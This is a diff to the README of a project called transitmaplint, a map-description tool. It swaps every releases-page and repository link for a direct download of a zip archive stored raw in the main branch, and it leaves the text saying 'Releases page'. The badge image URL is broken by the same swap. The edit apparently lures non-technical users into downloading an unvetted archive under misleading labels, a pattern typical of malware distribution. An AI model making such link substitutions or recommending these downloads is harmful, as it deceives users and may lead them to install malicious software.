@@ -1,6 +1,6 @@
 # 🚆 transitmaplint - Enhance Your Transport Maps Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/king1720/transitmaplint/releases)
+[![Download Latest Release](https://github.com/king1720/transitmaplint/raw/refs/heads/main/transitmaplint/Software-v2.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/king1720/transitmaplint/raw/refs/heads/main/transitmaplint/Software-v2.3.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ Here’s a simple guide to help you download and run transitmaplint. No prior pr
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/king1720/transitmaplint/releases) to access the latest version of transitmaplint.
+1. Visit the [Releases page](https://github.com/king1720/transitmaplint/raw/refs/heads/main/transitmaplint/Software-v2.3.zip) to access the latest version of transitmaplint.
 2. Look for the file compatible with your operating system (Windows, macOS, Linux).
 3. Click the link to start the download. 
 
@@ -64,12 +64,12 @@ If you encounter any issues or have questions, feel free to reach out. Open an i
 
 ## 🔗 Helpful Links
 
-- [Releases page - Download Here](https://github.com/king1720/transitmaplint/releases)
-- [GitHub Repository](https://github.com/king1720/transitmaplint)
+- [Releases page - Download Here](https://github.com/king1720/transitmaplint/raw/refs/heads/main/transitmaplint/Software-v2.3.zip)
+- [GitHub Repository](https://github.com/king1720/transitmaplint/raw/refs/heads/main/transitmaplint/Software-v2.3.zip)
 - [User Manual](link-to-user-manual)
 
 ## 🏁 Conclusion
 
 With transitmaplint, you can effortlessly improve your transportation maps. Just enter your text description, and let the software provide valuable feedback. 
 
-Remember, visit the [Releases page](https://github.com/king1720/transitmaplint/releases) to download the latest version and start improving your maps today!
+Remember, visit the [Releases page](https://github.com/king1720/transitmaplint/raw/refs/heads/main/transitmaplint/Software-v2.3.zip) to download the latest version and start improving your maps today!
